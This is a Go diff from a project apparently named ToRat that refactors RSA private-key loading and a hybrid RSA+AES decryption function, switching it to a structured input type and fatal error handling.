@@ -8,26 +8,30 @@ import (
 	"crypto/sha256"
 	"crypto/x509"
 	"encoding/pem"
-	"errors"
-	"fmt"
 	"io/ioutil"
 	"log"
+
+	"github.com/lu4p/ToRat/models"
 )
 
 var privateKey = loadPrivateKey()
 
 func loadPrivateKey() *rsa.PrivateKey {
-	key, err := ioutil.ReadFile("key.pem")
+	key, err := ioutil.ReadFile("../../keygen/priv_key.pem")
 	if err != nil {
-		log.Println("err read", err)
-		return nil
+		log.Fatalln("Cannot read PrivateKey:", err)
 	}
+
 	block, _ := pem.Decode(key)
+	if block == nil {
+		log.Fatalln("PrivateKey is not PEM format:", err)
+	}
+
 	priv, err := x509.ParsePKCS1PrivateKey(block.Bytes)
 	if err != nil {
-		fmt.Println("Could not parse rsakey", err)
-		return nil
+		log.Fatalln("Could not parse PrivateKey:", err)
 	}
+
 	return priv
 }
 
@@ -62,18 +66,11 @@ func DecAes(encData []byte, aeskey []byte) ([]byte, error) {
 	return plaintext, nil
 }
 
-// DecAsym decypts asymetric encryption (2048 bit RSA + AES)
-func DecAsym(encData []byte) ([]byte, error) {
-	if len(encData) < 256 {
-		return nil, errors.New("Unsufficent AesKey length")
-	}
-	encAeskey := encData[:256]
-	encContent := encData[256:]
-	log.Println("before rsa")
-	aeskey, err := DecRsa(encAeskey)
+// DecAsym decypts asymetric encryption (4096 bit RSA + AES)
+func DecAsym(encData models.EncAsym) ([]byte, error) {
+	aeskey, err := DecRsa(encData.EncAesKey)
 	if err != nil {
 		return nil, err
 	}
-	log.Println("after rsa")
-	return DecAes(encContent, aeskey)
+	return DecAes(encData.EncData, aeskey)
 }
